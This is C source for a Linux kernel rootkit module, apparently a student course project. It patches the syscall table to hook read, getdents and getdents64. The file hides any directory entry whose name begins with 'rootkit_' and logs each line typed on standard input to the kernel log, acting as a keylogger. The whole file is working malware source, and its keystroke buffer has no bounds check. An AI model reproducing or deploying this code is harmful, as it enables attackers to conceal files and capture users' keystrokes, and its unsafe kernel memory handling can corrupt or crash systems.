#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/init.h>      /* Custom named entry/exit function */
#include <linux/unistd.h>    /* Original read-call */
#include <asm/cacheflush.h>  /* Needed for set_memory_ro, ...*/
#include <asm/pgtable_types.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <asm/uaccess.h>

#include "sysmap.h"          /* Pointers to system functions */

// since we had no problems without get/put, we commented it out
// #define USE_MODULE_GET_PUT
#ifdef USE_MODULE_GET_PUT
#define OUR_TRY_MODULE_GET if (!try_module_get(THIS_MODULE)){return -EAGAIN;}
#define OUR_MODULE_PUT module_put(THIS_MODULE)
#else
#define OUR_TRY_MODULE_GET 
#define OUR_MODULE_PUT 
#endif

//#define DEBUG_ON
#ifdef DEBUG_ON
#define OUR_DEBUG(...) printk(KERN_INFO __VA_ARGS__)
#else
#define OUR_DEBUG(...)
#endif

// to read secret messages from the command line, we need
// some infrastructure to handle this.
#define INITIAL_CL_SIZE 256
char *internal_cl;
unsigned int cl_size;
unsigned int cl_pos;

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                       /* length is actually (d_reclen - 2 -
                          offsetof(struct linux_dirent, d_name) */
};


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
// for hooking the original read function
typedef asmlinkage ssize_t (*fun_ssize_t_int_pvoid_size_t)(unsigned int, char __user *, size_t);
// for hooking getdents (32 and 64 bit)
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent_int)(unsigned int, struct linux_dirent __user *, unsigned int);
typedef asmlinkage ssize_t (*fun_long_int_linux_dirent64_int)(unsigned int, struct linux_dirent64 __user *, unsigned int);

fun_ssize_t_int_pvoid_size_t     original_read;
fun_long_int_linux_dirent_int    original_getdents;
fun_long_int_linux_dirent64_int  original_getdents64;

/* Make a certain address writeable */
void make_page_writable(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);

    pageTableEntry->pte |=  _PAGE_RW;
}

/* Make a certain address readonly */
void make_page_readonly(long unsigned int _addr){
    unsigned int dummy;
    pte_t *pageTableEntry = lookup_address(_addr, &dummy);
    pageTableEntry->pte = pageTableEntry->pte & ~_PAGE_RW;
}

// hooked functions
asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
    ssize_t retval;
    char __user* cur_buf;
    OUR_TRY_MODULE_GET;
    retval = original_read(fd, buf, count);
    cur_buf = buf;
    if (fd == 0){
        if (buf[0] == 127){
            cl_pos = (cl_pos==0) ? 0 : cl_pos - 1;
        }
        else if (buf[0] == 13) {
            internal_cl[cl_pos] = 0;
            cl_pos = 0;
            printk(KERN_INFO "Received: %s\n", internal_cl);
            memset(internal_cl, 0, cl_size);
        }
        else {
            internal_cl[cl_pos++] = buf[0];
        }
        // printk(KERN_INFO "%d = hooked_read(%d, %s(=%d), %d)\n", retval, fd, buf, buf[0], count);
    }
    OUR_MODULE_PUT;
    return retval;
}

asmlinkage ssize_t hooked_getdents (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
    struct linux_dirent __user *cur_dirent;
    ssize_t result;
    int bpos;
    char hidename[] = "rootkit_";
    unsigned short cur_reclen;

    OUR_TRY_MODULE_GET;

    result = original_getdents(fd, dirent, count);
    OUR_DEBUG("----------------- Here are the files ------------------------------------");
    cur_dirent = dirent;

    for (bpos=0; bpos < result;){
        cur_dirent = (struct linux_dirent*)((char *)dirent + bpos);

        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
            cur_reclen = cur_dirent->d_reclen;
            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
            result -= cur_reclen;
            //printk(KERN_INFO "new result = %d\n", result);
        } else {
            bpos += cur_dirent->d_reclen;
        }
    }

    OUR_DEBUG("----------------- End of file list ------------------------------------");
    OUR_MODULE_PUT
    return result;

}

asmlinkage ssize_t hooked_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
    struct linux_dirent64 __user *cur_dirent;
    ssize_t result;
    int bpos;
    char hidename[] = "rootkit_";
    unsigned short cur_reclen;

    OUR_TRY_MODULE_GET;

    result = original_getdents64(fd, dirent, count);
    OUR_DEBUG("----------------- Here are the files ------------------------------------");
    cur_dirent = dirent;

    for (bpos=0; bpos < result;){
        cur_dirent = (struct linux_dirent64*)((char *)dirent + bpos);

        OUR_DEBUG("%s\n", (char*)(cur_dirent->d_name));
        if(0==memcmp(hidename, cur_dirent->d_name, strlen(hidename))) {
            OUR_DEBUG("found a file to hide:%s\n",cur_dirent->d_name);
            //printk(KERN_INFO "shift by %d from %p to %p --- result = %d\n",cur_dirent->d_reclen, cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), result);
            cur_reclen = cur_dirent->d_reclen;
            memmove(cur_dirent, ((char*)cur_dirent + cur_dirent->d_reclen), (size_t)(result - bpos - cur_dirent->d_reclen));
            memset((char*)dirent + result - cur_reclen, 0, cur_reclen);
            result -= cur_reclen;
            //printk(KERN_INFO "new result = %d\n", result);
        } else {
            bpos += cur_dirent->d_reclen;
        }
    }

    OUR_DEBUG("----------------- End of file list ------------------------------------");
    OUR_MODULE_PUT
    return result;



}

/* Hooks the read system call. */
void hook_functions(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  // retrieve original functions
  original_read = sys_call_table[__NR_read];
  original_getdents = sys_call_table[__NR_getdents];
  original_getdents64 = sys_call_table[__NR_getdents64];
  // remove write protection
  make_page_writable((long unsigned int) ptr_sys_call_table);

  // replace function pointers! YEEEHOW!!
  sys_call_table[__NR_read] = (void*) hooked_read;
  sys_call_table[__NR_getdents] = (void*) hooked_getdents;
  sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
}

/* Hooks the read system call. */
void unhook_functions(void){
  void** sys_call_table = (void *) ptr_sys_call_table;
  make_page_writable((long unsigned int) ptr_sys_call_table);
  // here, we restore the original functions
  sys_call_table[__NR_read] = (void*) original_read;
  sys_call_table[__NR_getdents] = (void*) original_getdents;
  sys_call_table[__NR_getdents64] = (void*) original_getdents64;
  make_page_readonly((long unsigned int) ptr_sys_call_table);
}
/* Print the number of running processes */
int print_nr_procs(void){
    fun_int_void npf; // function pointer to function counting processes
    int res;
    npf = (fun_int_void) ptr_nr_processes;
    res = npf();
    printk(KERN_INFO "%d processes running", res);
    return 0;
}

/* Initialization routine */
static int __init _init_module(void)
{
    cl_size = INITIAL_CL_SIZE;
    internal_cl = kmalloc(sizeof(char) * cl_size, GFP_KERNEL);
    cl_pos = 0;
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
    print_nr_procs();
    hook_functions();
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    // kfree(internal_cl);
    unhook_functions();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);


/* OTHER STUFF */

/*
 * Get rid of taint message by declaring code as GPL.
 */
MODULE_LICENSE("GPL");

/*
 * Module information
 */
MODULE_AUTHOR("Philipp Müller, Roman Karlstetter");    /* Who wrote this module? */
MODULE_DESCRIPTION("hacks your kernel");                /* What does it do? */

